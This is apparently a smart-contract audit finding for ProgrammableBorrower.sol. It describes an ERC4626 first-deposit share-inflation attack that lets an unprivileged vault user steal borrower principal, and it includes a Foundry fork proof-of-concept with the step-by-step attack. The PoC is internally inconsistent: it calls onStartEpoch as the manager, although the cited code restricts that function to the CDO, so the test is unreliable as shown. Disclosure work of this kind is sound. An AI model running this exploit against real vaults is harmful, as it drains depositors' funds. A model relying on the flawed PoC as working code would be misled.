### Title
First-deposit share inflation lets an ERC4626 vault user steal programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` accepts an arbitrary configured ERC4626 vault only after checking that its asset matches the CDO token; it does not require a seeded vault, inflation-resistant implementation, minimum-share result, or slippage bound. [1](#0-0)   
During `onStartEpoch`, it snapshots the pre-deposit asset total as principal and then deposits all idle underlying without checking that the vault returned nonzero or economically sufficient shares. [2](#0-1)   
An ordinary user of a vulnerable, initially empty ERC4626 vault can create the classic inflated-share state before the first borrower deposit, causing the borrower’s deposit to mint zero shares while the attacker later redeems nearly all pooled assets. [3](#0-2) 

### Finding Description
The vulnerable sequence is:

1. The configured programmable-borrower vault is empty or economically uninitialized.
2. An attacker deposits `1 wei` and receives the first vault share.
3. The attacker directly transfers approximately `D` underlying to the vault, making one share claim almost the entire vault balance.
4. Honest owner or manager calls `IdleCDOEpochVariant.startEpoch`.
5. The CDO transfers pool principal to `ProgrammableBorrower`, then calls `onStartEpoch`.
6. `onStartEpoch` records `underlyingToken.balanceOf(this) + _currentVaultAssets()` as `epochStartVaultAssets`. [4](#0-3) 
7. `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but ignores the returned share count and has no minimum-share assertion. [3](#0-2) 
8. With vault assets `D + 1 wei` and supply `1`, a normal ERC4626 `deposit(D)` rounds `D * 1 / (D + 1)` to zero shares.
9. The borrower principal baseline remains approximately `D`, while `_currentVaultAssets()` is zero because the borrower owns zero shares. [5](#0-4) 
10. The attacker redeems their one vault share and receives approximately `2D` assets: their donation plus the victim principal.

This is not prevented by `_skimDonatedAssets`, because the donation goes to the external vault rather than remaining as raw underlying in the CDO. [6](#0-5)   
It also is not prevented by default handling: after the shares are lost, the programmable borrower either reports a vault loss or cannot source the requested funds, while the attacker has already withdrawn the assets from the ERC4626 vault. [7](#0-6) 

### Impact Explanation
An unprivileged ERC4626 vault user can steal substantially all of the programmable borrower’s first deposit into an inflation-vulnerable vault. The loss is approximately `D - 1 wei`, where `D` is the pooled principal deposited by `onStartEpoch`; the attacker initially contributes about `D + 1 wei` but recovers both that contribution and the victim’s `D` when redeeming the sole vault share.

This breaks solvency and fair asset backing: CDO accounting records the pre-deposit amount as epoch principal, but the programmable borrower receives no corresponding vault position. [8](#0-7)   
At epoch stop, the missing position either becomes a realized loss or causes borrower funding to fail, leaving active tranche holders or pending withdrawal receipts to absorb the stolen principal. [9](#0-8) 

### Likelihood Explanation
The exploit requires only that the selected ERC4626 vault be empty and implement asset/share conversion without adequate inflation protection. `ProgrammableBorrower.initialize` validates the vault asset but not its total supply, share valuation, virtual shares, or minimum liquidity state. [10](#0-9)   
The attacker needs only the deposit amount capital temporarily and ordinary access to deposit into and redeem from the configured vault; no owner, manager, borrower, guardian, Keyring, queue, or `feeReceiver` privilege is needed.  
The attack can be prepared before the first manager `startEpoch` transaction because `startEpoch` transfers funds to the programmable borrower and then immediately routes the borrower’s idle balance through the unchecked vault deposit. [11](#0-10) 

### Recommendation
Require an explicit minimum-share output for every `_depositToVault` call and revert if `shares == 0` or `vault.convertToAssets(shares)` is materially below the deposited assets. Initialize or seed the configured vault before connecting it, or restrict integrations to ERC4626 vaults with verified inflation protection such as virtual shares/assets and a minimum initial supply. On start, compare `vault.deposit` results against a manager-supplied or internally computed slippage bound before updating `epochStartVaultAssets`. [12](#0-11) 

### Proof of Concept
A Foundry fork PoC can use the deployed underlying token, deployed ERC4626 vault, deployed `ProgrammableBorrower`, and its configured CDO. The test should pin a block before the borrower’s first vault deposit, deal enough underlying to the attacker, inflate the empty vault, execute the normal CDO epoch-start path, and redeem the attacker’s single share.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "../../contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";

contract ProgrammableBorrowerVaultInflationTest is Test {
    IERC20Detailed internal asset;
    IERC4626 internal vault;
    ProgrammableBorrower internal borrower;
    IdleCDOEpochVariant internal cdo;

    address internal attacker = address(0xA77A);

    function testFirstDepositInflationStealsEpochPrincipal() external {
        vm.createSelectFork(vm.envString("FORK_RPC_URL"), vm.envUint("FORK_BLOCK"));

        borrower = ProgrammableBorrower(vm.envAddress("PROGRAMMABLE_BORROWER"));
        vault = borrower.vault();
        cdo = IdleCDOEpochVariant(borrower.idleCDO());
        asset = borrower.underlyingToken();
        address manager = cdo.owner();

        uint256 poolPrincipal = 1_000_000e6;
        deal(address(asset), attacker, poolPrincipal + 1);

        // Attacker creates the inflated first-share vault state.
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        uint256 attackerShares = vault.deposit(1, attacker);
        assertEq(attackerShares, 1);
        asset.transfer(address(vault), poolPrincipal);
        vm.stopPrank();

        // The fixture should place approximately `poolPrincipal` as idle
        // programmable-borrower cash immediately before startEpoch.
        deal(address(asset), address(borrower), poolPrincipal);

        // Honest manager starts the epoch. ProgrammableBorrower deposits all
        // cash without checking that vault.deposit returned nonzero shares.
        vm.prank(manager);
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.epochStartVaultAssets(), poolPrincipal);

        // The sole attacker share now owns the donation plus the pool deposit.
        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(attackerShares, attacker, attacker);

        assertEq(asset.balanceOf(attacker), attackerBefore + redeemed);
        assertGe(redeemed, 2 * poolPrincipal);
        assertEq(vault.balanceOf(address(borrower)), 0);
    }
}
```

The essential invariant is `vault.deposit(D, borrower) > 0` and `convertToAssets(mintedShares) ~= D`; the current implementation emits `DepositedIntoVault` even when `shares` is zero. [3](#0-2)

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L108-135)
```text
  function initialize(
    address _vault, address _idleCDO, address _owner,
    address _manager, address _borrower, uint256 _borrowerApr
  ) external initializer {
    if (
      _vault == address(0) || _owner == address(0) || _manager == address(0) ||
      _borrower == address(0) || _idleCDO == address(0)
    ) {
      revert InvalidAddress();
    }
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-220)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-348)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }

```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-303)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
      // The borrower did not receive the funds, so keep the strategy-token backing in the strategy.
      _transferUnderlyings(address(_strategy), _toBorrower);
      _strategy.reserveDefaultRecovery(_toBorrower);
      _handleBorrowerDefault(_toBorrower);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-505)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
      // Split pending withdraw fees before update accounting
      // NOTE: Fees are sent with 2 different transfer calls, here and after updateAccounting, to avoid complicated calculations
      if (!_mintInterest) {
        _transferFeeUnderlyings(_pendingWithdrawFees);
      }

      if (_isRequestingAllFunds) {
        // we already have strategyTokens equal to _totBorrowed in this contract
        // so we transfer _totBorrowed to the strategy to avoid double counting for getContractValue
        _transferUnderlyings(address(_strategy), _totBorrowed);
      }

      if (_mintInterest) {
        // if interest is not transferred we mint strategy tokens equal to the full epoch interest
        if (_grossInterest != 0) _strategy.mintStrategyTokens(_grossInterest);
        // and increase unclaimedFees by pending withdraw fees before _updateAccounting
        unclaimedFees += _pendingWithdrawFees;
      }

      // update tranche prices and unclaimed fees
      _updateAccounting();

      // transfer fees
      uint256 _fees = unclaimedFees;
      if (_mintInterest) {
        // If interest is minted then we mint new shares for fee receivers instead of transferring underlyings
        if (_fees != 0) {
          uint256 feeReceiverAmount = _feeReceiverAmount(_fees);
          if (feeReceiverAmount != 0) {
            _mintSharesAtCurrPrice(feeReceiverAmount, feeReceiver, AATranche);
          }
          _mintSharesAtCurrPrice(_fees - feeReceiverAmount, owner(), AATranche);
          _updateSplitRatio(_getAARatio(true));
        }
      } else {
        // Cash-funded fees can only use gross interest not already owed to pending withdrawals.
        uint256 _availableForFees = _grossInterest > _pendingWithdrawFees ? _grossInterest - _pendingWithdrawFees : 0;
        if (_fees > _availableForFees) {
          _fees = _availableForFees;
        }
        _transferFeeUnderlyings(_fees);
      }
      // Any fee that cannot be paid in cash remains accrued and continues reducing NAV.
      unclaimedFees -= _fees;

      uint256 _totalFees = _fees + (_mintInterest ? 0 : _pendingWithdrawFees);
      // save net gain (this does not include interest gained for pending withdrawals)
      uint256 netInterest = _grossInterest > _totalFees ? _grossInterest - _totalFees : 0;
      lastEpochInterest = netInterest;
      // mint strategyTokens equal to interest and send underlying to strategy to avoid double counting for NAV
      _strategy.deposit(_mintInterest ? 0 : netInterest);

      // save last apr, unscaled
      lastEpochApr = _strategy.unscaledApr();
      // set apr for next epoch
      _setScaledApr(_newApr);

      // stop epoch
      isEpochRunning = false;
      expectedEpochInterest = 0;
      pendingWithdrawFees = 0;

      if (!skipDefaultCheck) {
        // Reopen ordinary deposits and requests only when operations were not explicitly shut down.
        _unpause();
        allowAAWithdrawRequest = true;
        allowBBWithdrawRequest = true;
      }
      // block instant withdraws claims as these can be done only after the deadline
      // or only if borrower is repaying all funds
      allowInstantWithdraw = _isRequestingAllFunds;

      if (_isRequestingAllFunds) {
        // user will request only normal withdraw and can claim right after
        disableInstantWithdraw = true;
        epochDuration = 0;
        epochEndDate = 0;
      }

      emit AccrueInterest(_expectedInterest - _totBorrowed, _totalFees);
      if (_lossAmount != 0) {
        _strategy.burnStrategyTokens(_lossAmount);
        // Realize the active loss immediately through the ordinary BB-first waterfall.
        _forceUpdateAccounting();
      }
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```
